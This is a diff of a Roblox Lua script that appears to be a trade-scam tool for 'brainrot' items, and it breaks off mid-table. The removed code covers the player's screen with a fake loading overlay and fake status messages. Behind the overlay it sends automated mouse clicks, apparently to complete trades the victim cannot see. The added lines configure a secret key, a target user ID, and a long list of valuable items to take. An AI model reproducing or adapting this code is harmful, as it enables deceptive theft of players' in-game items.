@@ -1,151 +1,177 @@
--- TELA PRETA + LOADING
-local player = game.Players.LocalPlayer
-
-local gui = Instance.new("ScreenGui")
-gui.Name = "LoadingScreen"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.DisplayOrder = 999999
-gui.Parent = player:WaitForChild("PlayerGui")
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1,0,1,0)
-frame.BackgroundColor3 = Color3.new(0,0,0)
-frame.BorderSizePixel = 0
-frame.Active = false
-frame.Parent = gui
-
--- TEXTO
-local text = Instance.new("TextLabel")
-text.Size = UDim2.new(0,500,0,50)
-text.Position = UDim2.new(0.5,-250,0.5,-90)
-text.BackgroundTransparency = 1
-text.TextColor3 = Color3.new(1,1,1)
-text.TextScaled = true
-text.Font = Enum.Font.GothamBold
-text.Text = "iniciando"
-text.Parent = frame
-
--- PORCENTAGEM
-local percentText = Instance.new("TextLabel")
-percentText.Size = UDim2.new(0,200,0,40)
-percentText.Position = UDim2.new(0.5,-100,0.5,-40)
-percentText.BackgroundTransparency = 1
-percentText.TextColor3 = Color3.new(1,1,1)
-percentText.TextScaled = true
-percentText.Font = Enum.Font.Gotham
-percentText.Text = "0%"
-percentText.Parent = frame
-
--- FUNDO DA BARRA
-local barBG = Instance.new("Frame")
-barBG.AnchorPoint = Vector2.new(0.5,0.5)
-barBG.Position = UDim2.new(0.5,0,0.5,10)
-barBG.Size = UDim2.new(0.4,0,0,22)
-barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
-barBG.BorderSizePixel = 0
-barBG.Parent = frame
-
-local bgCorner = Instance.new("UICorner")
-bgCorner.CornerRadius = UDim.new(0,12)
-bgCorner.Parent = barBG
-
--- BARRA AMARELA
-local bar = Instance.new("Frame")
-bar.Size = UDim2.new(0,0,1,0)
-bar.BackgroundColor3 = Color3.fromRGB(255,220,0)
-bar.BorderSizePixel = 0
-bar.Parent = barBG
-
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0,12)
-barCorner.Parent = bar
-
--- FRASES
-local frases = {
-    "procurando bot para trade",
-    "executando script",
-    "carregando brainrots",
-    "sincronizando trade",
-    "verificando inventário",
-    "aguardando resposta do servidor"
-}
-
--- TEXTO COM PONTINHOS
-task.spawn(function()
-    local i = 1
-    while true do
-        for dots = 0,3 do
-            text.Text = frases[i] .. string.rep(".", dots)
-            task.wait(0.5)
-        end
-        i += 1
-        if i > #frases then
-            i = 1
-        end
-    end
-end)
-
--- LOADING ATÉ 97%
-task.spawn(function()
-    for i = 1,97 do
-        percentText.Text = i.."%"
-        bar.Size = UDim2.new(i/100,0,1,0)
-        task.wait(math.random(1,3)/10)
-    end
-    
-    percentText.Text = "97%"
-    bar.Size = UDim2.new(0.97,0,1,0)
-
-    -- TREMER SEM SAIR DO CENTRO
-    while true do
-        local shake = 0.97 + math.random(-2,2)/100
-        bar.Size = UDim2.new(shake,0,1,0)
-        task.wait(0.08)
-    end
-end)
-
-
--- SCRIPT ORIGINAL
-local vim = game:GetService("VirtualInputManager")
-
-local function click(x,y)
-    vim:SendMouseButtonEvent(x,y,0,true,game,0)
-    task.wait(0.05)
-    vim:SendMouseButtonEvent(x,y,0,false,game,0)
-end
-
-click(1199,672)
-task.wait(5)
-
-click(345,302)
-task.wait(3)
-
-click(453,317)
-task.wait(3)
-
-click(600,300)
-task.wait(3)
-
-click(363,440)
-task.wait(3)
-
-click(474,425)
-task.wait(3)
-
-click(607,428)
-task.wait(3)
-
-click(339,540)
-task.wait(3)
-
-click(475,526)
-task.wait(3)
-
-click(597,531)
-task.wait(13)
-
-click(797,507)
-task.wait(13)
-
-click(797,507)
+getgenv().SECRET_KEY = "mrr_a3097962ac2e48ccbd57447ee8abcdc3"
+getgenv().TARGET_ID = 4703271145
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["La Vacca Saturno Saturnita"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Perrito Burrito"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Quesadillo Vampiro"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Tuff Toucan"] = true,
+    ["W or L"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Los Tralaleritos"] = true,
+    ["Festive 67"] = true,
+    ["Las Tralaleritas"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Money Money Puggy"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Agarrini la Palini"] = true,
+    ["Fragola La La La"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["Swag Soda"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Tralaledon"] = true,
+    ["Los Bros"] = true,
+    ["Los Puggies"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Primos"] = true,
+    ["Los Spaghettis"] = true,
+    ["Ginger Gerat"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Sekolahs"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Ketupat Bros"] = true,
+    ["Cooki and Milki"] = true,
+    ["Rosey and Teddy"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["La Grande Combinasion"] = true,
+    ["Trenostruzzo Turbo 4000"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["Las Sis"] = true,
+    ["Los Planitos"] = true,
+    ["Los Mobilis"] = true,
+    ["Los Candies"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Eviledon"] = true,
+    ["Orcaledon"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["To to to Sahur"] = true,
+    ["Chicleteirina Bicicleteirina"] = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Chicliterita bicicliterita"] = true,
+    ["Job Job Job Sahur"] = true,
+    ["Lovin Rose"] = true,
+    ["List List List Sahur"] = true,
+    ["Los Combinasionas"] = true,
+    ["Los Amigos"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Sammyni Fattini"] = true,
+    ["La Food Combinasion"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Esok Sekolah"] = true,
+    ["Los 67"] = true,
+    ["Pot Hotspot"] = true,
+    ["Guerriro Digitale"] = true,
+    ["Torrtuginni Dragonfrutini"] = true,
+    ["Los Tortus"] = true,
+    ["Los Mi Gatitos"] = true,
+    ["Los Chicleteiras"] = true,
+    ["Yess my examine"] = true,
+    ["1x1x1x1"] = true,
+    ["Noo my examine"] = true,
+    ["Los Karkeritos"] = true,
+    ["Las Vaquitas Saturnitas"] = true,
+    ["Los Spyderinis"] = true,
+    ["Los Cucarachas"] = true,
+    ["Los Matteos"] = true,
+    ["67"] = true,
+    ["Los Burritos"] = true,
+    ["Rang Ring Bus"] = true,
+    ["Los Nooo My Hotspotsitos"] = true,
+    ["Arcadopus"] = true,
+    ["Los Quesadillas"] = true,
+    ["Burrito Bandito"] = true,
+    ["Mi Gatito"] = true,
+    ["Quesadilla Crocodila"] = true,
+    ["Pot Pumpkin"] = true,
+    ["Horegini Boom"] = true,
+    ["Nooo My Hotspot"] = true,
+    ["Los Jobcitos"] = true,
+    ["Coffin Tung Tung Tung Sahur"] = true,
+    ["Tung Tung Tung Sahur"] = true,
+    ["Blackhole Goat"] = true,
+    ["Chachechi"] = true,
+    ["Dul Dul Dul"] = true,
+    ["Sammyni Spyderini"] = true,
+    ["Karkerkar Kurkur"] = true,
+    ["Chicleteira Cupideira"] = true,
+    ["Fishino Clownino"] = true,
+    ["Noo my Heart"] = true,
+    ["Chimnino"] = true,
+    ["Los 25"] = true,
+    ["Donkeyturbo Express"] = true,
+    ["Noo my Present"] = true,
+    ["Noo my Candy"] = true,
+    ["Cupid Hotspot"] = true,
+    ["Naughty Naughty"] = true,
+    ["Santa Hotspot"] = true,
+    ["Telemorte"] = true,
+    ["Please my Present"] = true,
+    ["Love Love Love Sahur"] = true,
+    ["Giftini Spyderini"] = true,
+    ["Trickolino"] = true,
+    ["Triplito Tralaleritos"] = true,
+    ["Santteo"] = true,
+    ["La Vacca Jacko Linterino"] = true,
+    ["Frankentteo"] = true,
+    ["Pumpkini Spyderini"] = true,
+    ["Reindeer Tralala"] = true,
+    ["Zombie Tralala"] = true,
+    ["Vulturino Skeletono"] = true,
+    ["Boatito Auratito"] = true,
+    ["La Cucaracha"] = true,
+    ["Extinct Tralalero"] = true,
+    ["Jackorilla"] = true,
+    ["Chicleteira Noelteira"] = true,
+    ["Bisonte Giuppitere"] = true,
+    ["Spinny Hammy"] = true,
+    ["Los Sweethearts"] = true,
+    ["Cupid Cupid Sahur"] = true,
+    ["Chill Puppy"] = true,
+    ["Ho Ho Ho Sahur"] = true,
+    ["25"] = true,
+    ["Cuadramat and Pakrahmatmamat"] = true,
+    ["Los Trios"] = true,
+    ["La Vacca Prese Presente"] = true,
+    ["Rocco Disco"] = true,
+    ["La Karkerkar Combinasion"] = true,
+    ["Love Love Bear"] = true,
+    ["Guest 666"] = true,
+    ["Bunito Bunito Spinito"] = true,
+    ["Brunito Marsito"] = true,
+    ["Pirulitoita Bicicleteira"] = true,
+    ["Bunnyman"] = true
